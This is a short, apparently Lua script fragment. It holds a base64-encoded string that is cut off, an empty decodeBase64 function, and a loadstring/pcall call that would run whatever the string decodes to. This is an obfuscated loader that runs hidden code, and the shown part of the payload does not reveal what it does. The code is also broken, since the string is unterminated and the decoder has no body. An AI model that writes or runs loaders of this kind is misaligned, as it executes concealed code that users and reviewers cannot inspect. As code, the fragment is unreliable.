
---...




local encodedScript = "LS0tLS0g5L2g55qE5Y+N5Yir5pah5pys...

local function decodeBase64(data)
    
end

local scriptContent = decodeBase64(encodedScript)
local func, err = loadstring(scriptContent)
if func then
    pcall(func)
end
